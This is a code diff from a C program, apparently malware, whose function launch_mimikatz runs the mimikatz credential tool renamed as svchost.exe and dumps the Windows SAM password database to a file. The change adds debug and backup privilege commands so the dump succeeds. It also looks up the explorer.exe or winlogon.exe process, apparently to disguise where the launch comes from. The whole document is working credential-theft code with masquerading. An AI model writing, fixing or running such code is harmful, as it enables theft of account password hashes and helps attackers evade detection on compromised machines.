@@ -84,11 +84,11 @@ static void launch_mimikatz(void) {
     char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
     wsprintfA(svchost, "%s\\svchost.exe", g_dir);
     wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
-    // ponytail: mimicatz output is NOT reliably captured via redirected stdout
-    // under CREATE_NO_WINDOW (it allocs its own console). Use its built-in
-    // `log` command to write the dump to a file directly.
+    // ponytail: lsadump::sam needs SeBackupPrivilege to open HKLM\SAM; mimikatz
+    // only auto-enables SeDebugPrivilege. Enable both before the dump, and use
+    // the built-in `log` command (stdout redirection is unreliable here).
     DeleteFileA(dump);
-    wsprintfA(cmd, "\"%s\" \"log %s\" \"lsadump::sam\" \"exit\"", svchost, dump);
+    wsprintfA(cmd, "\"%s\" \"log %s\" \"privilege::debug\" \"privilege::backup\" \"lsadump::sam\" \"exit\"", svchost, dump);
 
     DWORD pid = find_pid_by_name("explorer.exe");
     if (!pid) pid = find_pid_by_name("winlogon.exe");
